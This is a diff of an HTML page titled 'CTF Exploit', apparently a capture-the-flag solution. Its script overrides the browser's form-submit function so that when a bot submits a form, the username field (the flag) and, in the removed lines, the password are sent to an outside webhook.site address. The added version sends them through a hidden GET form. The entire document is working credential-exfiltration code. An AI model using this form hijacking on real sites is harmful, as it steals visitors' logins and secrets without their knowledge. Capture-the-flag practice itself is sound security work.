@@ -4,23 +4,38 @@
     <title>CTF Exploit</title>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Attempting to leak flag...</h1>
     <script>
         const WEBHOOK_URL = "https://webhook.site/48f9efa9-a38a-4c44-b214-5bdde77e8adf";
+
+        const originalSubmit = HTMLFormElement.prototype.submit;
 
         HTMLFormElement.prototype.submit = function() {
             console.log("Form submission hijacked!");
 
-            const formData = new FormData(this);
-            const username = formData.get('username');
-            const password = formData.get('password');
+            try {
+                const formData = new FormData(this);
+                const username = formData.get('username');
+                const password = formData.get('password');
 
-            fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`, {
-                mode: 'no-cors'
-            });
+                console.log("Captured username:", username);
 
-            alert("Form hijacked!");
+                if (username) {
+                    const leakForm = document.createElement('form');
+                    leakForm.action = `${WEBHOOK_URL}?flag=${encodeURIComponent(username)}&source=hijacked_submit`;
+                    leakForm.method = 'GET'; 
+                    leakForm.style.display = 'none';
+
+                    document.body.appendChild(leakForm);
+                    leakForm.submit(); 
+                    console.log("Leak form submitted!");
+                }
+            } catch (e) {
+                console.error("Error during hijacked submit:", e);
+            }
         };
+
+        console.log("Prototype polluted. Waiting for bot to interact with forms.");
     </script>
 </body>
 </html>
